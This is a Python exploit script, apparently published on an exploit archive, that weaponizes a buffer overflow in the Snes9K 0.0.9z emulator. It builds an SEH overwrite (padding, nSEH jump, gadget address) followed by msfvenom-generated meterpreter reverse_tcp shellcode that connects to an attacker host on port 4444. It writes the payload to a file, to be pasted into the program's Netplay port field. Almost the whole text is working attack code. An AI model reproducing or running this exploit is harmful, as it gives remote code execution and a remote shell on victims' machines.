#!/usr/bin/python
# 
#
# This is a weaponized version of the original Denial of Service (PoC)
# available at https://www.exploit-db.com/exploits/45504
#
# Exploit Title: Snes9K 0.0.9z Buffer Overflow
# Date: 2019-01-21
# Original PoC Exploit Author: crash_manucoot
# Exploit Author: Paolo Perego - paolo@armoredcode.com
# Vendor Homepage: https://sourceforge.net/projects/snes9k/
# Software Link: https://sourceforge.net/projects/snes9k/files/latest/download
# Version: 0.0.9z
# Tested on: 
#   - Windows 7 Professional SP1 x86
#
# Category: Windows Remote Code Execution
#
# How to use: open the program go to Netplay-Options-paste the contents of open.txt 
# in the Socket Port Number and Boom 
#
# It executes a meterpreter reverse tcp connection on the attacker's machine.
# After the session it has been opened, you have to migrate to another user's
# process in order to have a reliable channel since the victim process is very
# unstable after exploitation.

 
buffer = "A" * 260

nseh = "\xeb\x06\x90\x90"
# ROP Gadget = 10015204
seh = "\x04\x52\x01\x10"

shellcode = "\x90"*4

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 EXITFUNC="thread" -f py -v shellcode -b '\x00\x0d'

shellcode += "\xdb\xc1\xd9\x74\x24\xf4\xb8\x29\x8f\x89\x23\x5e"
shellcode += "\x29\xc9\xb1\x5b\x31\x46\x19\x03\x46\x19\x83\xc6"
shellcode += "\x04\xcb\x7a\x75\xcb\x89\x85\x86\x0c\xed\x0c\x63"
shellcode += "\x3d\x2d\x6a\xe7\x6e\x9d\xf8\xa5\x82\x56\xac\x5d"
shellcode += "\x10\x1a\x79\x51\x91\x90\x5f\x5c\x22\x88\x9c\xff"
shellcode += "\xa0\xd2\xf0\xdf\x99\x1d\x05\x21\xdd\x43\xe4\x73"
shellcode += "\xb6\x08\x5b\x64\xb3\x44\x60\x0f\x8f\x49\xe0\xec"
shellcode += "\x58\x68\xc1\xa2\xd3\x33\xc1\x45\x37\x48\x48\x5e"
shellcode += "\x54\x74\x02\xd5\xae\x03\x95\x3f\xff\xec\x3a\x7e"
shellcode += "\xcf\x1f\x42\x46\xe8\xff\x31\xbe\x0a\x82\x41\x05"
shellcode += "\x70\x58\xc7\x9e\xd2\x2b\x7f\x7b\xe2\xf8\xe6\x08"
shellcode += "\xe8\xb5\x6d\x56\xed\x48\xa1\xec\x09\xc1\x44\x23"
shellcode += "\x98\x91\x62\xe7\xc0\x42\x0a\xbe\xac\x25\x33\xa0"
shellcode += "\x0e\x9a\x91\xaa\xa3\xcf\xab\xf0\xab\x3c\x86\x0a"
shellcode += "\x2c\x2a\x91\x79\x1e\xf5\x09\x16\x12\x7e\x94\xe1"
shellcode += "\x23\x68\x27\x3d\x8b\xf8\xd9\xbe\xec\xd1\x1d\xea"
shellcode += "\xbc\x49\xb7\x93\x56\x89\x38\x46\xc2\x83\xae\xa9"
shellcode += "\xbb\xab\x49\x42\xbe\xcb\x84\xce\x37\x2d\xf6\xbe"
shellcode += "\x17\xe1\xb7\x6e\xd8\x51\x50\x65\xd7\x8e\x40\x86"
shellcode += "\x3d\xa7\xeb\x69\xe8\x90\x83\x10\xb1\x6a\x35\xdc"
shellcode += "\x6f\x17\x75\x56\x9a\xe8\x38\x9f\xef\xfa\x2d\xf8"
shellcode += "\x0f\x02\xae\x6d\x10\x68\xaa\x27\x47\x04\xb0\x1e"
shellcode += "\xaf\x8b\x4b\x75\xb3\xcb\xb4\x08\x82\xa0\x83\x9e"
shellcode += "\xaa\xde\xeb\x4e\x2b\x1e\xba\x04\x2b\x76\x1a\x7d"
shellcode += "\x78\x63\x65\xa8\xec\x38\xf0\x53\x45\xed\x53\x3c"
shellcode += "\x6b\xc8\x94\xe3\x94\x3f\xa7\xe4\x6b\xc2\x80\x4c"
shellcode += "\x04\x3c\x91\x6c\xd4\x56\x11\x3d\xbc\xad\x3e\xb2"
shellcode += "\x0c\x4e\x95\x9b\x04\xc5\x78\x69\xb4\xda\x50\x2f"
shellcode += "\x68\xdb\x57\xf4\x9b\xa6\x18\x0b\x5c\x57\x31\x68"
shellcode += "\x5c\x58\x3d\x8e\x60\x8f\x04\xe4\xa7\x0c\x33\xe7"
shellcode += "\x35\xb8\x4e\x80\xe3\x29\xf3\xcd\x13\x84\x30\xe8"
shellcode += "\x97\x2c\xc9\x0f\x87\x45\xcc\x54\x0f\xb6\xbc\xc5"
shellcode += "\xfa\xb8\x13\xe5\x2e"

evil = buffer + nseh + seh+shellcode + "D"*(1000-len(buffer)-9 -len(shellcode) )

file = open('open.txt','w+')
file.write(evil)
            
